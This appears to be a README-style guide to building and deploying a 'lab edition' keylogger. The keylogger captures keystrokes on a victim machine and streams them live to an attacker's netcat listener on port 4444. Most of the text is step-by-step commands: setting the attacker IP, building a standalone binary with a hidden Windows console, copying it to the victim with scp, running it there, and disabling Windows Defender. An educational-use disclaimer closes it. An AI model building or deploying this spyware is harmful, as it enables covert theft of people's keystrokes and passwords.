# ================================
# Network Keystroke Monitor (Lab Edition)
# ================================

# A standalone keystroke logger designed for cybersecurity lab simulations.
# It captures keystrokes on a victim machine and streams them to a Kali Linux
# listener in real time.

# ------------------------------------------------
# CONFIGURATION
# ------------------------------------------------

nano src/main.py

# Change the attacker IP:
KALI_IP="192.168.X.X"

# Replace with your Kali Linux IP.

# ------------------------------------------------
# BUILD INSTRUCTIONS
# ------------------------------------------------

# ----- Linux (Ubuntu / Arch) -----

pip install pynput pyinstaller
pyinstaller --onefile --clean --paths=src src/main.py

# Output:
# dist/main

# ----- Windows (PowerShell / CMD) -----

pip install pynput pyinstaller
pyinstaller --onefile --noconsole --clean --paths=src src/main.py

# Output:
# dist/main.exe
# --noconsole hides the terminal window on Windows

# ------------------------------------------------
# LAB SIMULATION – HOW TO RUN
# ------------------------------------------------

# Lab Setup:
# Attacker: Kali Linux
# Victim: Windows / Ubuntu / Arch Linux
# Port: 4444

# ----- Step 1: Attacker (Kali) -----

nc -lvp 4444

# ------------------------------------------------
# Step 2: Transfer Binary to Victim
# ------------------------------------------------

# Example from Kali to Linux victim:
scp dist/main user@VICTIM_IP:/home/user/

# ------------------------------------------------
# Step 3: Execution on Victim
# ------------------------------------------------

# ----- Linux Victim -----

chmod +x main
./main

# (No output = normal behavior)

# ----- Windows Victim -----

# Double-click:
# main.exe
# (Disable Windows Defender for lab testing if needed)

# ------------------------------------------------
# RESULT
# ------------------------------------------------

# Type on the victim machine
# Keystrokes appear live on the Kali terminal

# ------------------------------------------------
# FEATURES
# ------------------------------------------------

# - Cross-platform (Linux & Windows)
# - Standalone binary (no Python needed on victim)
# - Stealth mode on Windows (--noconsole)
# - Clean keystroke stream

# ------------------------------------------------
# DISCLAIMER
# ------------------------------------------------

# FOR AUTHORIZED EDUCATIONAL LAB USE ONLY.
# DO NOT USE ON REAL SYSTEMS OR REAL USERS.
